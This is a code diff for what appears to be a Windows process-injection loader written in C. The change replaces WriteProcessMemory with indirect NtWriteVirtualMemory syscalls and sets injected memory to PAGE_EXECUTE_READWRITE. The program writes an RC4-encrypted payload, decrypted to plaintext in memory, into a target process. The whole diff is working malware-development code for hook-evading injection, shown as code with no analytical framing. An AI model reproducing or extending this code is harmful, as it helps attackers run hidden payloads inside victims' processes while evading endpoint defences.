@@ -209,15 +209,6 @@ int LoadStuffFromDisk(const char* fileName, void* data) {
 //---------------------------------------------------------------------------------------------------------------------------------
 //---------------------------------------------------------------------------------------------------------------------------------
 
-BOOL WriteProcess(IN HANDLE hProcess, IN PVOID uBaseAddress, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
-	DWORD sNumberOfBytesWritten = 0;
-	SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
-	if ((STATUS = RunSyscall(hProcess, uBaseAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) || 1024 != sNumberOfBytesWritten) {
-		printf("[!] NtWriteVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
-		printf("[i] Wrote %d of %d Bytes \n", (int)sNumberOfBytesWritten, 1024);
-		return FALSE;
-	}
-}
 
 int main(int argc, char* argv[]) {
 
@@ -327,7 +318,7 @@ int main(int argc, char* argv[]) {
 
 
 		SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
-		if ((STATUS = RunSyscall(hTargetProcess, &uBaseAddress, &pRc4Encrypt, PAGE_EXECUTE_READ, &dwOldProtection)) != 0x00) {
+		if ((STATUS = RunSyscall(hTargetProcess, &uBaseAddress, &pRc4Encrypt, PAGE_EXECUTE_READWRITE, &dwOldProtection)) != 0x00) {
 			printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
 			return -1;
 		}
@@ -368,8 +359,13 @@ int main(int argc, char* argv[]) {
 		}
 
 		//printf("[+] Syscall Number Of NtWriteVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWriteVirtualMemory.dwSSn, g_Nt.NtWriteVirtualMemory.pSyscallInstAddress);
-		WriteProcess(hTargetProcess, uBaseAddress, Rc4EncData, 1024);
-
+		SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
+		if ((STATUS = RunSyscall(hTargetProcess, uBaseAddress, Rc4EncData, 1024, &sNumberOfBytesWritten)) || 1024 != sNumberOfBytesWritten) {
+			printf("[!] NtWriteVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
+			printf("[i] Wrote %d of %d Bytes \n", (int)sNumberOfBytesWritten, 1024);
+			getchar();
+			return FALSE;
+		}
 
 		// Rc4EncData is now plaintext payload
 
@@ -417,11 +413,19 @@ int main(int argc, char* argv[]) {
 
 		// Rc4EncData is now plaintext payload
 
-		if (!WriteProcessMemory(hTargetProcess, (uBaseAddress + (dwCurrentProcess * 1024)), (Rc4EncData + (dwCurrentProcess * 1024)), 1024, &sNumberOfBytesWritten) || 1024 != sNumberOfBytesWritten) {
+		SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
+		if (STATUS = RunSyscall(hTargetProcess, (uBaseAddress + (dwCurrentProcess * 1024)), (Rc4EncData + (dwCurrentProcess * 1024)), 1024, &sNumberOfBytesWritten) || 1024 != sNumberOfBytesWritten) {
+			printf("[!] NtWriteVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
+			printf("[i] Wrote %d of %d Bytes \n", (int)sNumberOfBytesWritten, 1024);
+			getchar();
+			return FALSE;
+		}
+
+		/*if (!WriteProcessMemory(hTargetProcess, (uBaseAddress + (dwCurrentProcess * 1024)), (Rc4EncData + (dwCurrentProcess * 1024)), 1024, &sNumberOfBytesWritten) || 1024 != sNumberOfBytesWritten) {
 			printf("[!] WriteProcessMemory Failed with Error: %d \n", GetLastError());
 			printf("[i] Wrote %d of %d Bytes \n", (int)sNumberOfBytesWritten, 1024);
 			return -1;
-		}
+		}*/
 
 		// Increment Write Process Number
 		dwCurrentProcess++;
